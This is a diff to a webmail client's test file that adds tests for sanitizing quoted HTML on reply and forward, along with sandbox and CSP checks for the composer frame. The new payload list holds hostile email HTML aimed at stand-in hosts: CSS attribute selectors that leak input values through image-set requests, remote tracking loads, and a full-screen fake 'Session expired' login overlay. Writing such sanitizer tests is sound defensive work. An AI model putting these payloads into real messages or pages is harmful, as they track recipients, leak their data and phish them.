@@ -2,7 +2,9 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { JSDOM } from 'jsdom';
 import createDOMPurify from 'dompurify';
-import { buildSrcDoc, iframeCsp, IFRAME_SANDBOX, sanitizeCss, sanitizeEmailHtml } from './htmlPolicy';
+import {
+  buildComposerDoc, buildSrcDoc, COMPOSER_SANDBOX, composerCsp, iframeCsp, IFRAME_SANDBOX, sanitizeCss, sanitizeEmailHtml,
+} from './htmlPolicy';
 
 // Malicious HTML corpus against the message rendering policy (DOMPurify bound
 // to a jsdom window, as in the browser). Run: npm run test:webmail (client/).
@@ -142,5 +144,63 @@ test('iframe: sandbox without scripts / same origin / forms / top navigation; st
   assert.ok(doc.startsWith(`<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${iframeCsp(false)}">`), doc.slice(0, 200));
   assert.match(doc, /<meta name="referrer" content="no-referrer">/);
   assert.match(doc, /<base target="_blank">/);
+  assert.doesNotMatch(doc, /<script/i);
+});
+
+// ── review: quoted HTML on reply / forward (composer) ──
+
+const compose = (html: string) => sanitizeEmailHtml(factory, html, { allowRemote: true, mode: 'compose' });
+
+/** The reviewer's payloads, through the reply path: reading view (no remote) then the composer. */
+const QUOTE_PAYLOADS: Array<[string, string]> = [
+  ['style element (global restyle / attribute selectors)', '<style>body{display:none} input[value^="a"]{background:image-set("https://evil.test/a" 1x)}</style><p>hi</p>'],
+  ['image-set in a style attribute', `<div style="background-image:image-set('https://evil.test/t.png' 1x)">x</div>`],
+  ['-webkit-image-set', `<div style="background-image:-webkit-image-set('https://evil.test/t.png' 1x)">x</div>`],
+  ['position:fixed overlay', '<a href="https://phish.test" style="position:fixed;inset:0;z-index:99999;background:#fff">Session expired - click to log in</a>'],
+  ['position via var()', '<div style="--p:fixed;position:var(--p)">x</div>'],
+  ['sticky / absolute', '<div style="position:-webkit-sticky;top:0">a</div><div style="position: ABSOLUTE !important;left:0">b</div>'],
+  ['src() / image()', `<div style="background:image('https://evil.test/i.png');mask:src('https://evil.test/m.png')">x</div>`],
+  ['url() remote', '<div style="background:url(https://evil.test/bg.png)">x</div>'],
+];
+
+test('composer: quoted HTML keeps no <style>, no remote CSS, no out-of-flow positioning (review payloads)', () => {
+  for (const [what, html] of QUOTE_PAYLOADS) {
+    const reading = clean(html, false).html;
+    for (const out of [compose(reading).html, compose(html).html]) {
+      assertInert(out, what);
+      assert.doesNotMatch(out, /<style/i, `${what}: <style> left in ${out}`);
+      assert.doesNotMatch(out, /image-set|evil\.test\/(?:a|t\.png|bg\.png|i\.png|m\.png)/i, `${what}: remote CSS left in ${out}`);
+      assert.doesNotMatch(out, /position:\s*(?:fixed|sticky|absolute|-webkit-sticky|var)/i, `${what}: positioning left in ${out}`);
+    }
+  }
+  // The phishing link itself stays a plain link (in the flow).
+  assert.match(compose(QUOTE_PAYLOADS[3][1]).html, /href="https:\/\/phish\.test"/);
+});
+
+test('reading view: image-set counts as a remote resource (blocked until "show images"); fixed overlays neutralized', () => {
+  const html = `<div style="background-image:image-set('https://tracker.example/t.png' 1x)">x</div><div style="background:-webkit-image-set(url(https://tracker.example/u.png) 1x)">y</div>`;
+  const off = clean(html, false);
+  assert.ok(off.blockedRemote >= 2, `blocked ${off.blockedRemote}`);
+  assert.doesNotMatch(off.html, /image-set/i);
+  assert.doesNotMatch(off.html, /tracker\.example/);
+  const on = clean(html, true);
+  assert.match(on.html, /image-set/i, 'shown on request');
+  const overlay = clean('<a style="position:fixed;inset:0" href="https://phish.test">x</a><div style="position:absolute">ok</div>', false).html;
+  assert.doesNotMatch(overlay, /position:\s*fixed/i);
+  assert.match(overlay, /position:absolute/, 'absolute stays inside the message frame');
+  // background-position & co. are not "position".
+  assert.match(clean('<div style="background-position:center;object-position:top">x</div>').html, /background-position:center;object-position:top/);
+});
+
+test('composer document: sandbox without scripts, CSP that loads nothing remote', () => {
+  assert.equal(COMPOSER_SANDBOX, 'allow-same-origin');
+  for (const flag of ['allow-scripts', 'allow-forms', 'allow-popups', 'allow-top-navigation', 'allow-modals']) assert.ok(!COMPOSER_SANDBOX.includes(flag), flag);
+  const csp = composerCsp();
+  assert.match(csp, /default-src 'none'/);
+  assert.match(csp, /img-src data: blob:(;|$)/);
+  assert.doesNotMatch(csp, /https:|script-src|'self'/);
+  const doc = buildComposerDoc('Write "here" <now>');
+  assert.ok(doc.includes(`content="${composerCsp()}"`), 'CSP meta first in head');
+  assert.match(doc, /data-placeholder="Write &quot;here&quot; &lt;now&gt;"/);
   assert.doesNotMatch(doc, /<script/i);
 });
